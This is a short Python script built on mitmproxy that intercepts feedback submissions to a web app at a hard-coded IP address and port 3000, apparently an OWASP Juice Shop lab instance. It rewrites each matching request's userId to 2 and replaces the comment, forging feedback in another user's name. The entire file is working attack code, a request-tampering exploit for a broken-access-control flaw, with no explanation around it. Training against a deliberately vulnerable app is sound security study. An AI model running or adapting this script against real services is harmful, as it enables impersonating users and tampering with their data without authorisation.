import json
import asyncio
from mitmproxy import http, options
from mitmproxy.tools.dump import DumpMaster

LISTEN_HOST = "127.0.0.1"
LISTEN_PORT = 8080
JUICE_URL_SNIPPET = "45.76.47.218:3000"

def modify_feedback_request(flow: http.HTTPFlow):
    try:
        # Check if the intercepted request is a feedback submission
        if "/api/Feedbacks" in flow.request.pretty_url and flow.request.method == "POST":
            request_content = json.loads(flow.request.text)

            # Modify the feedback to impersonate another user
            request_content["userId"] = 2  # Example: Changing to user ID 2
            request_content["comment"] = "This feedback has been forged!"

            # Replace the original request body
            flow.request.text = json.dumps(request_content)

            print("[*] Feedback request has been modified!")
    except Exception as e:
        print(f"[!] Error modifying feedback request: {e}")

class ForgedFeedback:
    def request(self, flow: http.HTTPFlow):
        if JUICE_URL_SNIPPET in flow.request.pretty_url:
            modify_feedback_request(flow)

async def run_proxy():
    opts = options.Options(listen_host=LISTEN_HOST, listen_port=LISTEN_PORT)
    m = DumpMaster(opts)
    m.addons.add(ForgedFeedback())
    try:
        await m.run()
    except KeyboardInterrupt:
        print("[!] Proxy interrupted.")
    finally:
        m.shutdown()

def forged_feedback():
    asyncio.run(run_proxy())
